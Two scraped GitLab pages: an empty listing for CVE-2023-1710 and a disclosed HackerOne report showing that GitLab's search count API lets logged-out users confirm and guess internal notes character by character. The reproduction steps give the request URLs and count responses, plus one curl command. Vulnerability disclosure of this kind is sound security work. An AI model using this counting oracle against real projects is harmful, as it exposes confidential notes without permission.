=== Content from gitlab.com_70faedb6_20250115_083642.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2023](/gitlab-org/cves/-/tree/master/2023)
* [**CVE-2023-1710.json**](/gitlab-org/cves/-/blob/master/2023/CVE-2023-1710.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2023/CVE-2023-1710.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2023/CVE-2023-1710.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  Mar 31, 2023

  [8d18172f](/gitlab-org/cves/-/commit/8d18172ffea7124ae2e70a8047ca676f0e4df091)
  [Publishing 0 updated advisories and 14 new advisories](/gitlab-org/cves/-/commit/8d18172ffea7124ae2e70a8047ca676f0e4df091)
  繚
  8d18172f

  [ GitLab Bot ](/gitlab-bot) authored Mar 31, 2023

  8d18172f

  [Publishing 0 updated advisories and 14 new advisories](/gitlab-org/cves/-/commit/8d18172ffea7124ae2e70a8047ca676f0e4df091)
  [ GitLab Bot ](/gitlab-bot) authored Mar 31, 2023

Loading



=== Content from gitlab.com_6d8670bb_20250115_083643.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Gitlab search allows leaking internal notes

**[HackerOne report #1829768](https://hackerone.com/reports/1829768)** by `shells3c` on 2023-01-10, assigned to [@ameyadarshan](/ameyadarshan "Ameya Darshan"):

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Gitlab search count API returns the count of results gotten from internal notes despite users having no permission to view those notes. This results in guessing/brute-forcing the internal notes

##### Steps to reproduce

1. Create a public project, then a public issue and make an internal note with the message: **Internal comment**
2. Logout and do the following tests:

`https://gitlab.com/search/count?project_id=<ID>&scope=notes&search="Internal c"`

```
{"count":"1"}
```

`https://gitlab.com/search/count?project_id=<ID>&scope=notes&search="Internal cc"`

```
{"count":"0"}
```

`https://gitlab.com/search/count?project_id=<ID>&scope=notes&search="Internal co"`

```
{"count":"1"}
```

`https://gitlab.com/search/count?project_id=<ID>&scope=notes&search="Internal comment"`

```
{"count":"1"}
```

##### Examples

I have created an example project for testing:

`curl 'https://gitlab.com/search/count?project_id=25681831&scope=notes&search=%22CVE-2021-1234%22'`

```
{"count":"1"}
```

You can confirm that the note `CVE-2021-1234` exists, even though you can't see it in the Gitlab search results: <https://gitlab.com/search?project_id=25681831&scope=notes&search=%22CVE-2021-1234%22>

#### Impact

Leaking internal notes of public issues

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


